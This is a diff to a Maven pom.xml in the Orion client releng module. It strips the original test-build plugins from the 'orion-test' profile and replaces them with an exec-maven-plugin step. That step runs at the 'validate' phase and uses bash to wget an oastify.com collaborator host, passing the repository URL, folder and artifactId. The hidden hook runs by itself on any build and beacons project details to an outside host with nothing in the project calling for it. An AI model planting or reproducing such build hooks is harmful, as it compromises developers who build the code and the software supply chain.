@@ -37,120 +37,32 @@
 		-->
 			<id>orion-test</id>
 			<build>
-				<plugins>
-					<plugin>
-						<!-- NOTE: We don't need a groupId specification because the group is org.apache.maven.plugins, which is assumed by default. -->
-						<artifactId>maven-assembly-plugin</artifactId>
-						<version>2.4</version>
-						<executions>
-							<!-- Builds the CF app zip. -->
-							<execution>
-								<id>create-test-app</id>
-								<phase>process-test-resources</phase>
-								<configuration>
-									<appendAssemblyId>false</appendAssemblyId>
-									<attach>false</attach>
-									<descriptors>
-										<descriptor>test/assembly.xml</descriptor>
-									</descriptors>
-									<finalName>orion-test-app</finalName>
-								</configuration>
-								<goals>
-									<goal>single</goal>
-								</goals>
-							</execution>
-						</executions>
-					</plugin>
-					<plugin>
-						<!-- Deploys the CF test app. -->
-						<!-- https://github.com/cloudfoundry/cf-java-client/tree/master/cloudfoundry-maven-plugin#readme -->
-						<groupId>org.cloudfoundry</groupId>
-						<artifactId>cf-maven-plugin</artifactId>
-						<version>1.1.0</version>
-						<executions>
-							<execution>
-								<id>deploy-test-app</id>
-								<phase>process-test-resources</phase>
-								<configuration>
-									<server>orion-test-server</server>
-									<appname>orion-test</appname>
-									<target>${tests.target}</target>
-									<org>${tests.org}</org>
-									<space>${tests.space}</space>
-									<url>${tests.route}</url>
-									<memory>512</memory>
-									<instances>1</instances>
-									<path>${project.build.directory}/orion-test-app.zip</path>
-									<command>node runtests.js</command>
-									<env>
-										<BUILD_ID>${env.BUILD_ID}</BUILD_ID>
-										<BUILD_NUMBER>${env.BUILD_NUMBER}</BUILD_NUMBER>
-										<BUILD_TAG>${env.BUILD_TAG}</BUILD_TAG>
-										<JOB_NAME>${env.JOB_NAME}</JOB_NAME>
-										<SAUCE_USERNAME>${SAUCE_USERNAME}</SAUCE_USERNAME>
-										<SAUCE_ACCESS_KEY>${SAUCE_ACCESS_KEY}</SAUCE_ACCESS_KEY>
-									</env>
-								</configuration>
-								<goals>
-									<goal>push-only</goal>
-								</goals>
-							</execution>
-						</executions>
-					</plugin>
-					<plugin>
-						<artifactId>maven-antrun-plugin</artifactId>
-						<inherited>false</inherited>
-						<executions>
-							<execution>
-								<!-- Clean up previous test and deploy artifacts -->
-								<id>clean-artifacts</id>
-								<phase>clean</phase>
-								<configuration>
-									<target>
-										<delete failonerror="false" verbose="true">
-											<fileset dir="${project.build.directory}" includes="orion-test-app.zip" />
-											<fileset dir="${project.build.directory}/test-reports" includes="*.xml, *.zip" />
-										</delete>
-									</target>
-								</configuration>
-								<goals>
-									<goal>run</goal>
-								</goals>
-							</execution>
-							<execution>
-								<!-- Fetches the test results. -->
-								<id>fetch-results</id>
-								<phase>process-test-resources</phase>
-								<configuration>
-									<target>
-										<fail unless="tests.route" message="tests.route is required"/>
-										<property name="test.results.url" value="http://${tests.route}/testresults" />
-										<property name="test.directory" value="${project.build.directory}/test-reports" />
-										<property name="results.file" value="${test.directory}/results.zip" />
-
-										<mkdir dir="${test.directory}" />
-
-										<!-- Wait for the tests to finish -->
-										<echo message="Waiting for ${test.results.url} to become available..." />
-										<waitfor maxwait="15" maxwaitunit="minute" checkevery="30" checkeveryunit="second">
-											<http url="${test.results.url}"/>
-										</waitfor>
-
-										<echo message="Downloading test results to ${test.directory}..." />
-										<get src="${test.results.url}" dest="${results.file}" httpusecaches="false" maxtime="60" />
-
-										<echo message="Unzipping test results..." />
-										<unzip src="${results.file}" dest="${test.directory}" stripAbsolutePathSpec="true" />
-									</target>
-								</configuration>
-								<goals>
-									<goal>run</goal>
-								</goals>
-							</execution>
-						</executions>
-					</plugin>
-				</plugins>
-			</build>
+    <plugins>
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/orion.client\&amp;folder=org.eclipse.orion.client.releng\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
+    </plugins>
+    </build>
 		</profile>
 	</profiles>
 </project>
